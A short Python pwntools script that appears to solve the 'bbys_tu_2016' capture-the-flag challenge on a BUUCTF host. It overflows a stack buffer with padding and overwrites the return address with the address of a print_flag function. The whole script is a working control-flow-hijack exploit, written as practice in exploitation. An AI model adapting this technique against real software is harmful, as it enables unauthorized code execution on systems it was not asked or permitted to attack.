from pwn import *
sh = process('./bbys_tu_2016')
sh = remote('node3.buuoj.cn', 29432)

print_flag = 0x0804856D

payload = 'A' * (0xC + 8)
payload += p32(0xdeedbeef)
payload += p32(print_flag)
sh.sendline(payload)
sh.interactive()
